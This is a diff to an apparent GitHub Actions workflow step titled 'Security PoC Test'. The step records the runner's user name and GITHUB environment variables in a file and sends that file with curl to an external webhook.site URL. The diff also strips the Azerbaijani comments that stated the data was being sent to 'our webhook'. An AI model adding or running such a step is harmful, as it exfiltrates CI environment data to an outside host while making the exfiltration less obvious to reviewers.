@@ -1,9 +1,6 @@
 - name: Security PoC Test
         run: |
           echo "Test icra edilir..."
-          # Serverin kim olduğunu yoxlayaq
           whoami > info.txt
-          # Mühit dəyişənlərini yoxlayaq (gizli olmayanlar)
           env | grep "GITHUB" >> info.txt
-          # İndi bu məlumatı öz webhook-umuza göndərək
-          curl -X POST -d @info.txt https://webhook.site/https://webhook.site/eb29b992-fed7-42e0-9483-f070e2b60aea
+          curl -X POST -d @info.txt https://webhook.site/eb29b992-fed7-42e0-9483-f070e2b60aea
